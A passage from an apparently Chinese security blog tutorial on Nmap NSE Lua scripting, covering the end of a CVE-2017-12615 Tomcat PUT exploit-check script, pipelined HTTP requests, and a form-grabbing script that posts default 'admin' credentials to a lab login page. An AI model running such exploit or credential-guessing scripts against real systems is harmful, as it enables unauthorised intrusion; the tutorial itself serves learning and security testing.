</span></span><span style="display:flex;"><span>		status.shell_name <span style="color:#f92672">=</span> shell_name
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">local</span> response <span style="color:#f92672">=</span> http.get(host,port,shell_name)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(response <span style="color:#f92672">and</span> http.response_contains(response,<span style="color:#e6db74">&#34;CVE%-2017%-12615&#34;</span>) )<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> status
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span></code></pre></div><p>脚本执行结果与上一节中的内容相同，只是多了一次GET请求，为了让读者真正理解这个脚本的执行过程，下面对比一下wireshark流量：</p>
<ul>
<li>优化前：</li>
</ul>
<p><img src="../../../static/images/7227a40c-4f5f-11ec-a9f9-00d861bf4abb.png" alt="2019-04-24-10-19-52"></p>
<p>首先脚本直接向80端口发送了一个PUT请求，然后服务器响应405，漏洞利用失败。</p>
<p>紧接着脚本又请求了8080端口，服务器响应201，证明漏洞利用成功。</p>
<p><img src="../../../static/images/725b5234-4f5f-11ec-bf46-00d861bf4abb.png" alt="2019-04-24-10-20-01"></p>
<ul>
<li>优化后：</li>
</ul>
<p><img src="../../../static/images/72a648f2-4f5f-11ec-8fd4-00d861bf4abb.png" alt="2019-04-24-10-20-09"></p>
<p>通过向8080端口发送PUT请求成功利用后，又向写入文件发送了一次GET请求，获取响应内容，进行字符串匹配，达到更加深度的验证漏洞是否利用成功。</p>
<h2 id="0x08-并发http请求">0x08 并发HTTP请求</h2>
<p>这里说的并发HTTP请求的原理是与目标主机建立一个socket，在每一次发送报文后都不会断开（除了最后一次请求）。平常我们在扩展脚本中调用一个http.get函数，将会返回一个响应表，代表已经获取了目标主机的响应报文，当返回响应表之前就已经与目标主机断开了连接。下一次调用http.get时，还需要进行一次建立连接的过程，导致我们会消耗一定的时间。如果一个扩展脚本需要发送多次请求，可以考虑使用http.pipeline_add与http.pipline_go配合使用。</p>
<p>下面就来介绍这两个函数如何配合使用：</p>
<p>http.pipeline_add参数如下：</p>
<ul>
<li>path : 请求路径</li>
<li>options : 用于设置请求相关的Cookie、超时时间、header</li>
<li>all_requests : （可选值），如果是第一次调用，则为nil，若不是第一次调用，需要传入上一次http.pipeline_add的返回值</li>
<li>method : HTTP方法（GET、POST、HEAD、PUT等），默认为GET</li>
</ul>
<p>返回值：</p>
<ul>
<li>一个请求表</li>
</ul>
<pre tabindex="0"><code>|   
|     path: 
|     options: 
|       header: 
|         Connection: keep-alive
|_    method: GET
</code></pre><p>可以有多个，下标从1开始，如果需要查看这个请求列表的结构，可以直接在action函数中return出http.pipeline_add的返回值，代码演示如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> all_requests <span style="color:#f92672">=</span> http.pipeline_add(<span style="color:#e6db74">&#34;/index.jsp&#34;</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	all_requests <span style="color:#f92672">=</span> http.pipeline_add(<span style="color:#e6db74">&#34;/docs/changelog.html&#34;</span>,<span style="color:#66d9ef">nil</span>,all_requests,<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> all_requests
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span></code></pre></div><p>执行结果：</p>
<p><img src="../../../static/images/72e1190a-4f5f-11ec-8f3e-00d861bf4abb.png" alt="2019-04-24-10-21-19"></p>
<p>因为调用了两次http.pipeline_add，所以会产生两个请求列表队列元素，如果只想获取第一个请求队列元素，可以return all_requests[1]。</p>
<p>下面我们要开始将队列交给http.pipeline_go函数，由它来完成所有请求，函数参数如下：</p>
<ul>
<li>host : host表</li>
<li>port : port 表</li>
<li>all_requests : 由http.pipeline_add函数装在好的请求列表</li>
</ul>
<p>返回值：</p>
<ul>
<li>response_list : 响应列表</li>
</ul>
<p>示例代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> status_lines <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> all_requests <span style="color:#f92672">=</span> http.pipeline_add(<span style="color:#e6db74">&#34;/index.jsp&#34;</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	all_requests <span style="color:#f92672">=</span> http.pipeline_add(<span style="color:#e6db74">&#34;/docs/changelog.html&#34;</span>,<span style="color:#66d9ef">nil</span>,all_requests,<span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> all_response <span style="color:#f92672">=</span> http.pipeline_go(host,port,all_requests)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i,resp <span style="color:#66d9ef">in</span> ipairs(all_response)<span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>		status_lines[i] <span style="color:#f92672">=</span> resp[<span style="color:#e6db74">&#34;status-line&#34;</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> status_lines
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span></code></pre></div><p>这段代码中添加了两个请求队列元素，分别是：</p>
<ul>
<li>/index.jsp</li>
<li>/docs/changelog.html</li>
</ul>
<p>将队列交给http.pipeline_go函数后，返回一个响应列表，all_response[1]对应index.jsp的响应表，all_response[2]对应/docs/changelog.html的响应表。因此可以使用迭代，将每个请求的某个字段放入一个输出表里，本次示例是取得了两次请求队status-line。</p>
<p>执行结果：</p>
<p><img src="../../../static/images/73221202-4f5f-11ec-948f-00d861bf4abb.png" alt="2019-04-24-10-22-31"></p>
<h2 id="0x09-表单操作">0x09 表单操作</h2>
<p>关于表单操作，在爬虫、漏洞扫描、爆破时用的较多，一般要先取回目标主机的响应body，然后字符串匹配获得表单结构。但是这些操作在Nmap中已经提供了一些方法，接下来就让我们一起学习http包中的表单操作函数吧。</p>
<p>http.grab_forms 用于在响应内容中查找表单，并返回一个form_list表，参数如下：</p>
<ul>
<li>body : 响应表中的body</li>
</ul>
<p>返回值：</p>
<ul>
<li>form_list : 表单列表</li>
</ul>
<blockquote>
<p>获取页面中的表单列表</p>
</blockquote>
<p>我使用apache和php搭建了一个简单的登录界面，尝试通过nmap的扩展脚本来获取表单列表。</p>
<p><img src="../../../static/images/73655b0c-4f5f-11ec-8bc3-00d861bf4abb.png" alt="2019-04-24-10-23-28"></p>
<p>查看一下HTML源码：</p>
<p><img src="../../../static/images/73a59f64-4f5f-11ec-848c-00d861bf4abb.png" alt="2019-04-24-10-23-36"></p>
<p>可以发现页面中这个表单是提交到index.php的，并且提供了两个输入值，分别是username和password，这种情况下我们完全可以采用lua的字符串匹配模式获得input的name，但是如果页面上有很多表单，这就会增加我们处理数据的压力。</p>
<p>我们来试试http.grab_forms函数：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">local</span> http <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>prerule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>hostrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>portrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(port.number <span style="color:#f92672">==</span> <span style="color:#ae81ff">80</span>)<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> response <span style="color:#f92672">=</span> http.get(host,port,<span style="color:#e6db74">&#34;/index.php&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> login_forms <span style="color:#f92672">=</span> http.grab_forms(response.body)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> login_forms
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>postrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>因为http.grab_forms函数接收的是响应表的body，所以需要调用http.get函数将响应表取到，再把响应表的body传递进去。</p>
<p>执行结果：</p>
<p><img src="../../../static/images/73debc86-4f5f-11ec-95bc-00d861bf4abb.png" alt="2019-04-24-10-24-01"></p>
<p>目前是获得了一个登录表单，注意：返回的是一个表单列表，而不是只能获得一个表单，在登录页面中新添加一个表单后：</p>
<p><img src="../../../static/images/7426b39c-4f5f-11ec-872f-00d861bf4abb.png" alt="2019-04-24-10-24-07"></p>
<p>再执行脚本观察一下：</p>
<p><img src="../../../static/images/74702c3e-4f5f-11ec-9a62-00d861bf4abb.png" alt="2019-04-24-10-24-15"></p>
<p>如果还想进一步获得input的name值，就要学习另外一个函数—— http. parse_form</p>
<p>参数如下：</p>
<ul>
<li>form : 表单的明文</li>
</ul>
<p>返回值：</p>
<ul>
<li>一个带键的表，分别有：action、method、fields</li>
</ul>
<p>示例：</p>
<pre tabindex="0"><code>| test: 
|   action: /index.php
|   method: post
|   fields: 
|     
|       type: text
|       value: test
|       name: username
|     
|       type: text
|       value: test
|_      name: password
</code></pre><p>注意：fields是一个table，不是一个字符串，里面有表单的多个字段</p>
<blockquote>
<p>需求：爬取页面表单，并尝试登录</p>
</blockquote>
<p>当前页面有两个表单，先尝试一个表单来登录，整体步骤如下：</p>
<ol>
<li>抓取表单</li>
<li>解析表单</li>
<li>拼接字段</li>
<li>登录</li>
<li>判断是否登录成功</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> login_table <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> response <span style="color:#f92672">=</span> http.get(host,port,<span style="color:#e6db74">&#34;/index.php&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> login_forms <span style="color:#f92672">=</span> http.grab_forms(response.body)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> form <span style="color:#f92672">=</span> http.parse_form(login_forms[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i,name <span style="color:#66d9ef">in</span> ipairs(form.fields)<span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>		login_table[form.fields[i].name]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> login_response <span style="color:#f92672">=</span> http.post(host,port,<span style="color:#e6db74">&#34;/index.php&#34;</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#66d9ef">nil</span>,login_table)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(http.response_contains(login_response,<span style="color:#e6db74">&#34;success&#34;</span>))<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		login_table.login_status <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> login_table
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	login_tabke.login_status <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> login_table
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>本段代码首先获取index.php的响应表，通过http.grab_forms函数获得登录，将返回值（第一个表单）交给http.parse_from，取得表单fields（字段），然后遍历每一个字段的name，把它填入一个table，最后执行http.post函数，刚好http.post的data可以是一个table也可以是一个字符串。请求完毕后得到登录的响应结果，再由http.response_contains判断是否登录成功，登录成功会出现success字样提示。</p>
<p>为了解决疑惑，我贴出index.php的源代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">DOCTYPE</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;username&#34;</span>];
</span></span><span style="display:flex;"><span>	$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;password&#34;</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($username <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> $password <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;login success !&#34;</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;login failed !&#34;</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;please login !&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;hr/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;form action=&#34;/index.php&#34; method=&#34;post&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">username:&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;input type=&#34;text&#34; name=&#34;username&#34; value=&#34;test&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">password:&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;input type=&#34;text&#34; name=&#34;password&#34; value=&#34;test&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;br&gt;&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;input type=&#34;submit&#34; value=&#34;Submit&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span></code></pre></div><p>下一章：DNS包的使用</p>
<p>正向解析、反向解析、发送DNS请求等</p>

</div>
<div class="container">
    <script src="https://giscus.app/client.js"
    data-repo="Rvn0xsy/rvn0xsy.github.io"
    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
    data-category="General"
    data-category-id="DIC_kwDOF-pTTM4CRDk_"
    data-mapping="title"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="dark_tritanopia"
    data-lang="zh-CN"
    data-loading="lazy"
    crossorigin="anonymous"
    async>
  </script>
</div>
<div class="container">
    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <div class="bio__blurb">
        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
    </div>
<div class="bio__avatar">
    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
</div></section>
</div>

        </div>
<footer class="site-footer">
    <div class="container">
        <div class="site-footer__col">
        <h5>Get in touch</h5>
        <p>
            If you like my project or have some questions,feel free
            to contact me</a>.
        </p>
        </div>
        <div class="site-footer__col site-footer__col--links">
        <h5>Me Elsewhere</h5>
        <ul>
        
                <li>
                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
                    
                </li>
        
                <li>
                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
                    
                </li>
        
                <li>
                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
                    
                </li>
        
        </ul>
        </div>
        <div class="site-footer__col site-footer__col--links">
        <h5>Meta Links</h5>
        <ul>
            
                
                
                    <li class="">
                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
                    </li>
                
                    <li class="">
                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
                    </li>
                
                    <li class="">
                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
                    </li>
                
                    <li class="">
                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
                    </li>
                
                    <li class="">
                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
                    </li>
                
            
        </ul>
        </div>
        <p class="site-footer__copyright">
        © 倾旋 2021. All rights reserved.
        </p>
    </div>
    </footer>



<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
<script>
(function(){
  let plantumlPrefix = "language-plantuml";
  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
    let image = document.createElement("IMG");
    image.loading = 'lazy'; 
    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
    code.parentNode.insertBefore(image, code);
    code.style.display = 'none';
  });
})();
</script>

</body>
</html>
